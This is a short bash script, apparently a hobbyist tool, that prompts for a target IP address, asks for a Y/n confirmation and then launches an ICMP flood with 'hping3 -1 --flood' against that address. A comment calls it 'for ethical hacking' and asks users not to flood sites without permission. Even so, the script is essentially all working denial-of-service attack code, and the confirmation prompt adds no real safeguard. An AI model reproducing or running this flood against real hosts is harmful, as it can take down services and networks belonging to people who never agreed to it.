#!/bin/bash

# NOTE: this is for ethical hacking so do not flood any website without permisson pls and thank you

# this is not a advanced script but just a basic. so test out and change if you want 

echo "enter ip to flood"
read IP

echo "this is all you need but..."
sleep 1
echo "be careful of what you are doing"
sleep 1
echo "do you wish to continue (Y or n)"
read WA
# WA stands for 'Warning Answer'

# you need hping3 for this attack; run 'sudo apt install hping3'

if [ "$WA" != "${WA#[Yy]}" ]; then
         echo "running your command now"
         hping3 -1 --flood $IP
else
         echo "exiting"
         exit
fi

# finished in 11 mins
# 26 lines
